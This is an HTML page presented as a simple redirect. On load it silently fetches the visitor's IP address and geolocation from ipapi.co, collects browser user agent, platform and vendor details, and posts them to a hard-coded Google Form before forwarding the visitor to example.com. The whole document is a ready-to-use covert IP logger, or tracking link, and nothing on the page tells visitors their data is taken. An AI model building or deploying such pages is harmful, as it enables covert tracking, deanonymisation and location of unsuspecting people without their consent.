<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // URL to redirect to after capturing data
        const REDIRECT_URL = "https://example.com";

        // Function to send data to Google Form and then redirect
        async function sendDataAndRedirect() {
            try {
                // Fetch IP and Geolocation data from a free API
                const geoResponse = await fetch('https://ipapi.co/json/');
                const geoData = await geoResponse.json();

                // Get other details from the user's browser
                const timestamp = new Date().toISOString();
                const userAgent = navigator.userAgent;
                const os = navigator.platform;
                const device = navigator.vendor;

                // Create a FormData object with your specific entry IDs
                const formData = new FormData();
                formData.append("entry.1496883719", timestamp);
                formData.append("entry.1535774579", geoData.ip);
                formData.append("entry.2067837825", os);
                formData.append("entry.747657848", device);
                formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
                formData.append("entry.448354724", userAgent);

                // Submit to your specific Google Form action URL
                await fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
                    method: "POST",
                    body: formData,
                    mode: "no-cors" // Important to prevent CORS errors
                });

            } catch (error) {
                console.error("Error capturing data:", error);
            } finally {
                // ALWAYS redirect the user, even if data capture fails
                window.location.href = REDIRECT_URL;
            }
        }
    </script>
</head>
<body onload="sendDataAndRedirect()">
    <p>You are being redirected. If you are not redirected automatically, <a href="https://example.com">click here</a>.</p>
</body>
</html>
